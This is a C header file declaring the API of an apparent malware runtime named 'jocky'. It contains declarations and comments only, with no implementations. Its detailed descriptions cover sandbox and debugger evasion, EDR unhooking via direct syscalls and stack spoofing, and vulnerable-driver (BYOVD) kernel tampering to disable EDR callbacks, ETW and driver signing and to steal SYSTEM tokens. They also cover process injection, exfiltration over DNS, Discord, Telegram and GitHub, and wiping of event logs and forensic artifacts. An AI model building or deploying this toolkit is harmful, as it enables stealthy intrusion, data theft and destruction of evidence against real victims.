#ifndef JOCKY_RT_H
#define JOCKY_RT_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

/* ============================================================================
 * Anti-Analysis: Debugger, VM, Sandbox Detection
 * ============================================================================ */

typedef enum {
    JOCKY_ANALYSIS_CLEAN = 0,
    JOCKY_ANALYSIS_DEBUGGER = 1 << 0,
    JOCKY_ANALYSIS_VM = 1 << 1,
    JOCKY_ANALYSIS_SANDBOX = 1 << 2,
} jocky_analysis_flags_t;

/* Run all anti-analysis checks. Returns bitmask of detected threats. */
uint32_t jocky_check_analysis_environment(void);

/* Individual checks */
bool jocky_is_debugger_present(void);
bool jocky_is_remote_debugger(void);
bool jocky_check_hardware_breakpoints(void);
bool jocky_is_vm(void);
bool jocky_is_sandbox(void);

/* Timing checks */
bool jocky_check_timing_rdtsc(void);
bool jocky_check_timing_api(void);

/* ============================================================================
 * Evasion: Unhooking, Syscalls, Stack Spoofing
 * ============================================================================ */

#ifdef _WIN32

/* ── ntdll unhooking ─────────────────────────────────────────────────── */

/* Reload a clean .text from System32\ntdll.dll, overwriting any inline
 * hooks placed by EDR/AV.  Uses NtProtectVirtualMemory directly to avoid
 * the hooked VirtualProtect.  Call before any sensitive ntdll-routed work. */
bool jocky_unhook_ntdll(void);

/* ── Direct syscalls: Hell's Gate + Halo's Gate ──────────────────────── */

/* Resolve SSN for a Zw* function name.
 * Hell's Gate: reads SSN from the unhooked stub directly.
 * Halo's Gate: if the stub is patched, scans adjacent Zw* exports in
 *              alphabetical (= SSN) order and infers the SSN by offset. */
uint32_t jocky_get_syscall_number(const char* zw_name);
uint32_t jocky_get_syscall_num   (const char* zw_name); /* alias */

/* Execute a direct syscall (up to 4 register args).
 * Allocates a one-shot RWX stub per call; does not call through ntdll. */
intptr_t jocky_direct_syscall (uint32_t ssn,
                                uintptr_t a1, uintptr_t a2,
                                uintptr_t a3, uintptr_t a4);
intptr_t jocky_direct_syscall4(uint32_t ssn,
                                uintptr_t a1, uintptr_t a2,
                                uintptr_t a3, uintptr_t a4); /* alias */

/* ── Stack / return-address spoofing ─────────────────────────────────── */

/* Find a RET gadget (0xC3) in ntdll.dll's .text section.
 * Prefers `ret; int3` (0xC3 0xCC) to avoid false-positive chains.
 * Result is cached on first call. */
PVOID jocky_find_ret_gadget(void);

/* Call fn(a1,a2,a3,a4) with the immediate return address replaced by a
 * RET gadget inside ntdll.dll.  During fn's execution the call stack shows:
 *   fn  ← ntdll!<ret gadget>  ← our real return addr (deeper)
 * Falls back to a direct call if no gadget is available. */
intptr_t jocky_spoof_call(PVOID fn,
                           uintptr_t a1, uintptr_t a2,
                           uintptr_t a3, uintptr_t a4);

/* Stack-spoofed direct syscall — combines jocky_spoof_call + jocky_direct_syscall.
 * The stack during the syscall shows a return addr inside ntdll.dll. */
intptr_t jocky_spoof_syscall(uint32_t ssn,
                              uintptr_t a1, uintptr_t a2,
                              uintptr_t a3, uintptr_t a4);

/* ── Nt* convenience wrappers ────────────────────────────────────────── */

typedef LONG NTSTATUS;

NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
                                           ULONG_PTR zero_bits, PSIZE_T size,
                                           ULONG type, ULONG protect);
NTSTATUS jocky_nt_protect_virtual_memory (HANDLE process, PVOID* base,
                                           PSIZE_T size, ULONG new_protect,
                                           PULONG old_protect);
NTSTATUS jocky_nt_write_virtual_memory   (HANDLE process, PVOID base,
                                           PVOID buffer, SIZE_T size,
                                           PSIZE_T written);
NTSTATUS jocky_nt_create_thread          (HANDLE* handle, ACCESS_MASK access,
                                           POBJECT_ATTRIBUTES attrs,
                                           HANDLE process, PVOID start,
                                           PVOID arg, ULONG flags, PULONG tid);

#endif /* _WIN32 (evasion) */

/* ============================================================================
 * BYOVD Loader
 * ============================================================================ */

#ifdef _WIN32
#include <windows.h>

/* State returned by jocky_byovd_load; pass to jocky_byovd_unload. */
typedef struct {
    HANDLE device;               /* open device handle (INVALID_HANDLE_VALUE if no symlink) */
    char   driver_path[MAX_PATH];/* path of the dropped .sys on disk */
    char   service_name[64];     /* SCM service name used to register it */
} jocky_byovd_t;

/* Extract the driver from the .jdrv PE section, drop it to %TEMP%, create
 * a kernel service, start it, and open a handle to \\.\ device_name.
 *
 * service_name  – SCM service name (NULL = auto-generate "jky_<hex>")
 * device_name   – NT device symlink name without "\\.\", e.g. "MyDriver"
 *                 (NULL = same as service_name)
 * out           – filled on success; caller must call jocky_byovd_unload()
 *
 * Returns false if no .jdrv section exists or any step fails.
 * Requires SeLoadDriverPrivilege / Administrator. */
bool jocky_byovd_load(const char* service_name,
                      const char* device_name,
                      jocky_byovd_t* out);

/* Stop the service, delete it from SCM, and delete the dropped .sys file. */
void jocky_byovd_unload(jocky_byovd_t* ctx);

/* ── Driver Interaction ─────────────────────────────────────────────────
 *
 * Two complementary systems:
 *
 *  1. Static profile table  – knows RTCore64, WinRing0/x64, gdrv.
 *     Primitive wrappers (read_phys / write_phys / read_msr / write_msr)
 *     auto-detect the loaded driver from ctx->service_name and use the
 *     correct IOCTL+buffer layout.
 *
 *  2. Dynamic .jmani manifest  – embedded at build time by
 *     "jockyc --manifest <file>".  Exposes any IOCTL by name via
 *     jocky_driver_invoke().  Falls back to this when the driver is not
 *     in the static table.
 *
 * Both systems use the same jocky_byovd_t handle returned by jocky_byovd_load.
 * ─────────────────────────────────────────────────────────────────────── */

/* Parse the .jmani section and populate the manifest cache.
 * Called automatically at first jocky_driver_invoke(); only needed
 * manually if you want early failure detection. */
bool jocky_manifest_load(void);

/* Read <size> bytes of physical memory starting at phys_addr into out.
 * Supports: RTCore64, WinRing0, WinRing0x64.
 * Falls back to manifest primitive "read_phys" for unknown drivers. */
bool jocky_driver_read_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                             void* out, uint32_t size);

/* Write <size> bytes from in to physical memory at phys_addr.
 * Supports: RTCore64, WinRing0, WinRing0x64. */
bool jocky_driver_write_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                              const void* in, uint32_t size);

/* Read a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_read_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                            uint64_t* out);

/* Write a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_write_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                             uint64_t val);

/* Map a physical address range and return the kernel VA via gdrv.
 * out_va receives the kernel virtual address.
 * Supports: gdrv. */
bool jocky_driver_map_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                            uint32_t size, uintptr_t* out_va);

/* Generic IOCTL dispatch via the .jmani manifest.
 * primitive  – must match a name in the embedded manifest exactly.
 * in_buf     – input buffer (may be NULL if in_size == 0).
 * in_size    – input buffer size in bytes.
 * out_buf    – output buffer (may be NULL if out_size == 0).
 * out_size   – output buffer size in bytes.
 * Returns false if the primitive name is not found or the IOCTL fails. */
bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
                         const void* in_buf,  uint32_t in_size,
                         void*       out_buf, uint32_t out_size);

#endif /* _WIN32 (BYOVD + driver interaction) */

/* ============================================================================
 * Kernel Exploitation Primitives  *(Windows only, requires BYOVD)*
 * ============================================================================ */

#ifdef _WIN32

/* ── Low-level kernel virtual R/W ───────────────────────────────────────
 * Built on top of jocky_driver_read/write_phys via 4-level page table walk.
 * Requires jocky_byovd_load() to have run first.
 * ctx->device must be valid; s_cr3 is lazily initialised on first call.    */
bool jocky_kread (jocky_byovd_t* ctx, uint64_t kva, void*       out, uint32_t size);
bool jocky_kwrite(jocky_byovd_t* ctx, uint64_t kva, const void* in,  uint32_t size);

/* ── Exploitation primitives ────────────────────────────────────────────
 * All of these call jocky_kread/jocky_kwrite internally.
 * Bootstrap: first call scans ≤ 1 GB physical memory for System EPROCESS
 * to obtain CR3.  Subsequent calls reuse the cached CR3.               */

/* Zero every active RoutineBlock* in PspCreateProcessNotifyRoutine,
 * PspCreateThreadNotifyRoutine, and PspLoadImageNotifyRoutine arrays.
 * Returns true if at least one callback was removed. */
bool jocky_disable_edr_callbacks(jocky_byovd_t* ctx);

/* Find and zero the EtwpEventEnabled flag referenced by EtwEventWrite.
 * Disables all kernel ETW write paths for this boot session. */
bool jocky_disable_etw(jocky_byovd_t* ctx);

/* Zero EPROCESS.Protection for the given PID, removing PPL/PP shielding.
 * After this call, the process can be opened with any desired access. */
bool jocky_strip_ppl(jocky_byovd_t* ctx, uint32_t pid);

/* Replace the primary token of target_pid with the SYSTEM process token,
 * granting SYSTEM-level privileges to the target process. */
bool jocky_elevate_token(jocky_byovd_t* ctx, uint32_t target_pid);

/* Strip SeDebug, SeTcb, and SeLoadDriver from target_pid's token bitmasks,
 * reducing an over-privileged process. */
bool jocky_downgrade_token(jocky_byovd_t* ctx, uint32_t target_pid);

/* Set g_CiOptions in ci.dll to 0, disabling Driver Signature Enforcement.
 * !! PatchGuard monitors this value – call only in a PG-suppressed window. !!
 * Original value is cached; call jocky_restore_dse() before unloading. */
bool jocky_disable_dse(jocky_byovd_t* ctx);

/* Restore g_CiOptions to the value captured by jocky_disable_dse().
 * No-op if jocky_disable_dse() was never called. */
bool jocky_restore_dse(jocky_byovd_t* ctx);

#endif /* _WIN32 (kernel exploitation) */

/* ============================================================================
 * Execution: In-Memory Techniques  *(Windows only)*
 * ============================================================================ */

#ifdef _WIN32

/* Process hollowing — create target_path suspended, replace its image with
 * payload, fix the entry point in the thread context, resume. */
bool jocky_process_hollow(const wchar_t* target_path,
                          const uint8_t* payload,
                          size_t payload_size);

/* Module stomping — find module_name in pid's loaded-module list, make its
 * region RWX, overwrite with payload (headers + sections), execute at EP. */
bool jocky_module_stomp(uint32_t pid,
                        const wchar_t* module_name,
                        const uint8_t* payload,
                        size_t payload_size);

/* Reflective DLL injection — write dll_bytes to RWX memory in pid, then
 * CreateRemoteThread at the "ReflectiveLoader" export inside the DLL.
 * Returns false if the DLL has no "ReflectiveLoader" export. */
bool jocky_rdll_inject(uint32_t pid,
                       const uint8_t* dll_bytes,
                       size_t dll_size);

/* Process parameter poisoning (P³) — overwrite PEB.RTL_USER_PROCESS_PARAMETERS
 * CommandLine and/or ImagePathName in the target process.  Pass NULL for any
 * field you don't want to change. */
bool jocky_p3_poison(uint32_t pid,
                     const wchar_t* fake_cmdline,
                     const wchar_t* fake_image_path);

/* Thread execution hijacking — find a thread in pid, suspend it, inject
 * shellcode into an RWX allocation, redirect the thread's RIP to it, resume. */
bool jocky_thread_hijack(uint32_t pid,
                          const uint8_t* shellcode,
                          size_t shellcode_size);

#endif /* _WIN32 (execution) */

/* ============================================================================
 * Exfiltration  *(Windows only)*
 * ============================================================================ */

#ifdef _WIN32

/* Encrypt data for transmission.
 * Generates a random 16-byte RC4 session key, prepends it to out, and
 * RC4-encrypts data into out+16.  out must be at least data_len + 16 bytes. */
bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
                          uint8_t* out, size_t* out_len);

/* Domain fronting — HTTPS POST to front_host (CDN SNI) with Host: real_host.
 * Certificate CN validation is relaxed; traffic still travels encrypted to
 * the CDN edge node before being forwarded to the real backend. */
bool jocky_exfil_front(const char* front_host, const char* real_host,
                        const char* path,
                        const uint8_t* data, size_t data_len);

/* DNS tunneling — encode data as base32-labeled A-record queries against
 * c2_domain.  The authoritative resolver for that domain logs all queries.
 * Format: <4-hex-seq>.<16-char-b32-chunk>.<c2_domain>
 * Terminates with a FFFF.END.<c2_domain> sentinel query. */
bool jocky_exfil_dns(const char* c2_domain,
                      const uint8_t* data, size_t data_len);

/* Discord webhook — POST base64(data) as message content.
 * webhook_url is the full URL including token.
 * Chunks at 1 500 bytes to stay within Discord's 2 000-char limit. */
bool jocky_exfil_discord(const char* webhook_url,
                          const uint8_t* data, size_t data_len);

/* Telegram Bot API — POST base64(data) as sendMessage text.
 * Chunks at 3 000 bytes (Telegram's 4 096-char limit). */
bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
                           const uint8_t* data, size_t data_len);

/* GitHub Gist — PATCH a Gist file named "d.txt" with base64(data).
 * token must have the gist scope. */
bool jocky_exfil_github(const char* token, const char* gist_id,
                         const uint8_t* data, size_t data_len);

#endif /* _WIN32 (exfiltration) */

/* ============================================================================
 * Cleanup: Anti-Forensics  *(Windows unless noted)*
 * ============================================================================ */

/* Delete the running executable using POSIX-semantics unlink (Win10+),
 * rename+delete-on-close (Win7+), or MoveFileEx reboot-delete as fallbacks.
 * Linux: unlinks /proc/self/exe immediately. */
bool jocky_self_delete(void);

/* Clear every Windows event log channel via EvtClearLog (all channels
 * including Sysmon, PowerShell, WMI-Activity).  Also clears legacy logs via
 * ClearEventLog.  Linux: journalctl vacuum + wtmp/lastlog truncate. */
bool jocky_clear_logs(void);

/* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
 * Uses Win32 file APIs — no child processes spawned. */
bool jocky_wipe_artifacts(void);

/* Delete all .pf files from %SystemRoot%\Prefetch. */
bool jocky_wipe_prefetch(void);

/* Delete the AppCompatCache registry value and flush the in-memory ShimCache
 * via the undocumented BaseFlushAppcompatCache() kernel32 export. */
bool jocky_patch_shimcache(void);

/* Load Amcache.hve as a temporary registry hive (requires SeBackupPrivilege
 * + SeRestorePrivilege), delete all entries whose path matches the current
 * executable, then unload the hive. */
bool jocky_patch_amcache(void);

/* Stop the SRUM service (svsvc), delete SRUDB.dat so Windows recreates it
 * empty, then restart the service.  Schedules deletion on next boot if the
 * file cannot be deleted immediately. */
bool jocky_clear_srum(void);

/* Run all cleanup steps in order: clear logs → wipe prefetch → patch ShimCache
 * → patch Amcache → clear SRUM → wipe artifacts → self-delete. */
bool jocky_cleanup_all(void);

/* ============================================================================
 * Memory Allocators
 * ============================================================================ */

/* Allocate a zero-initialized buffer of size bytes.
 * Windows: HeapAlloc(HEAP_ZERO_MEMORY).  Linux: calloc.
 * Returns NULL on failure or if size <= 0. */
void* jocky_alloc(int64_t size);

/* Free a buffer previously returned by jocky_alloc. No-op on NULL. */
void  jocky_free(void* ptr);

#ifdef _WIN32
/* Allocate a zeroed jocky_byovd_t context (opaque pointer; use with
 * jocky_byovd_load / jocky_byovd_unload / jocky_byovd_destroy). */
void* jocky_byovd_new(void);

/* Call jocky_byovd_unload() and then free the context. Safe on NULL. */
void  jocky_byovd_destroy(void* ctx);
#endif

/* ============================================================================
 * Crypto: String / Data Decryption
 * ============================================================================ */

/* Simple XOR decrypt in-place. Key rotates per byte. */
void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);

/* RC4-based stream decrypt */
void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);

/* ============================================================================
 * Integrity Verification
 * ============================================================================ */

/* Verify the on-disk binary against the .jtamp checksum embedded by the
 * packer.  Calls ExitProcess(0xDEAD1337) on mismatch.  Returns true if the
 * check passed or if .jtamp was not found (unpacked build).
 * Windows only; always returns true on other platforms.
 */
bool jocky_verify_integrity(void);

/* ============================================================================
 * Initialization
 * ============================================================================ */

/* Full runtime initialization sequence:
 *  1. Integrity check  (abort if binary was patched)
 *  2. Anti-analysis checks
 *  3. Return threat bitmask (0 = clean)
 */
uint32_t jocky_runtime_init(void);

#ifdef __cplusplus
}
#endif

#endif /* JOCKY_RT_H */
